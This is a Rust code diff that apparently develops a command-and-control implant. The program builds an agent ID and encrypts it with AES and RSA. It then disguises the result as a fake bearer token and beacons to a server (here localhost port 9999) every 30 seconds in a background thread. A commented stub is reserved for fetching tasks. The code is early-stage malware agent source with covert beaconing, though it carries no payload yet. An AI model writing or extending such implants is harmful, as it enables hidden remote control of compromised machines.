@@ -1,3 +1,5 @@
+use std::{thread, time::Duration};
+
 use base64::prelude::*;
 use common::crypt::aes;
 use rand::{distributions::Alphanumeric, Rng};
@@ -27,29 +29,31 @@ fn rsa_encrypt(message: &str) -> Vec<u8> {
         .expect("RSA encrypt failed")
 }
 
-#[tokio::main]
-async fn main() -> Result<(), Box<dyn std::error::Error>> {
+fn main() -> Result<(), Box<dyn std::error::Error>> {
     let agent_id: String = rand::thread_rng()
         .sample_iter(&Alphanumeric)
         .take(12)
         .map(char::from)
         .collect();
 
-    let fake_bearer = BASE64_STANDARD.encode(rsa_encrypt(&aes_encrypt(&agent_id)));
+    let beacon = || {
+        let fake_bearer = BASE64_STANDARD.encode(rsa_encrypt(&aes_encrypt(&agent_id)));
 
-    let client = reqwest::Client::new();
+        ureq::get("http://127.0.0.1:9999/index.html")
+            .set("Authorization", &format!("Bearer {}", fake_bearer))
+            .call()
+            .unwrap(); // TODO: Replace unwrap with non panic code
+    };
 
-    let res = client
-        .get("http://127.0.0.1:9999/index.html")
-        .header(
-            reqwest::header::AUTHORIZATION,
-            format!("Bearer {}", fake_bearer),
-        )
-        .send()
-        .await
-        .unwrap();
-
-    println!("{:?}", res);
+    rayon::scope(|s| {
+        s.spawn(|_| loop {
+            beacon();
+            thread::sleep(Duration::from_secs(30));
+        });
+        // s.spawn(|_| loop {
+        //     // TODO: Obtain tasks
+        // });
+    });
 
     Ok(())
 }
